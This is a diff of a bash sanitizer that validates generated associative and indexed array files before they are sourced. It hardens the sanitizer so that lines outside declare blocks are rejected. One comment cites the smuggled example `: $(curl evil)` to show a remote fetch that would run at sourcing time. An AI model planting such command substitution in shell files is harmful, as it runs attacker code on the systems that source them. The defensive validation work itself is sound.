@@ -99,38 +99,70 @@ _sanitize_generated_maps() {
     #   2. Body lines MUST match the entry regex with no forbidden chars
     #   3. Closer MUST be `)` alone (with optional whitespace)
     #
-    # Lines outside arrays (shebang, comments, blank lines) are ignored.
-    local in_array=0 line line_num=0
-    local entry_re='^[[:space:]]*\["[A-Za-z0-9._:/+-]+"\]="[A-Za-z0-9._:/+-]*"[[:space:]]*$'
+    # Lines outside arrays MUST also be safe — only shebang, comments, and
+    # blank lines (BB iter-1 F7 hardening). Any other line outside a
+    # `declare` block is rejected; bash would EXECUTE it at sourcing.
+    #
+    # Production codegen uses BOTH:
+    #   declare -A NAME=( ["k"]="v" ... )    associative — entry_re_assoc
+    #   declare -a NAME=( "v1" "v2" ... )    indexed — entry_re_indexed
+    local in_array=0 array_kind="" line line_num=0
+    local entry_re_assoc='^[[:space:]]*\["[A-Za-z0-9._:/+-]+"\]="[A-Za-z0-9._:/+-]*"[[:space:]]*$'
+    local entry_re_indexed='^[[:space:]]*[A-Za-z0-9._:/+-]+[[:space:]]*$'
+    local outside_re='^[[:space:]]*(#.*)?$'
+    local shebang_re='^#![[:space:]]*/'
     while IFS= read -r line; do
         line_num=$((line_num + 1))
-        if [[ "$line" =~ ^declare[[:space:]]+-A ]]; then
+        if [[ "$line" =~ ^declare[[:space:]]+-[Aa] ]]; then
             # Strict: opener line MUST end with `=(` (no inline body).
             # Reject `declare -A NAME=( ... )` single-line form (which is
             # how a hostile file would smuggle command-substitution past
             # the body-line check).
             if [[ ! "$line" =~ =\([[:space:]]*$ ]]; then
-                printf '[GOLDEN] REJECT line %d: declare -A must use multi-line form (opener ends with `=(`)\n' "$line_num" >&2
+                printf '[GOLDEN] REJECT line %d: declare must use multi-line form (opener ends with `=(`)\n' "$line_num" >&2
                 printf '[GOLDEN] saw: %q\n' "$line" >&2
                 return 1
             fi
             in_array=1
+            # Capture the array kind (-A associative vs -a indexed) so we
+            # apply the correct entry-shape check inside the body.
+            if [[ "$line" =~ ^declare[[:space:]]+-A ]]; then
+                array_kind="assoc"
+            else
+                array_kind="indexed"
+            fi
             continue
         fi
         if [[ $in_array -eq 1 ]]; then
             if [[ "$line" =~ ^\)[[:space:]]*$ ]]; then
                 in_array=0
+                array_kind=""
                 continue
             fi
             # Permit blank lines / comment lines inside array body.
             if [[ -z "${line//[[:space:]]/}" ]] || [[ "${line#"${line%%[![:space:]]*}"}" == \#* ]]; then
                 continue
             fi
-            # Strict-shape check: ["KEY"]="VALUE" only, with safe charset.
-            if ! [[ "$line" =~ $entry_re ]]; then
-                printf '[GOLDEN] REJECT line %d: array entry does not match safe ["KEY"]="VALUE" shape\n' "$line_num" >&2
+            # Strict-shape check: choose regex based on array kind.
+            local re
+            if [[ "$array_kind" == "assoc" ]]; then
+                re="$entry_re_assoc"
+            else
+                re="$entry_re_indexed"
+            fi
+            if ! [[ "$line" =~ $re ]]; then
+                printf '[GOLDEN] REJECT line %d: array entry does not match safe shape (kind=%s)\n' "$line_num" "$array_kind" >&2
                 printf '[GOLDEN] saw: %q\n' "$line" >&2
                 printf '[GOLDEN] expected charset: [A-Za-z0-9._:/+-] (no shell metas)\n' >&2
+                return 1
+            fi
+        else
+            # Outside any array — only shebang / comment / blank lines allowed.
+            # BB iter-1 F7: prevents `: $(curl evil)` smuggled OUTSIDE the
+            # declare block (bash executes it at sourcing time).
+            if [[ ! "$line" =~ $outside_re ]] && [[ ! "$line" =~ $shebang_re ]]; then
+                printf '[GOLDEN] REJECT line %d: line outside `declare -A` block must be shebang/comment/blank\n' "$line_num" >&2
+                printf '[GOLDEN] saw: %q\n' "$line" >&2
                 return 1
             fi
         fi
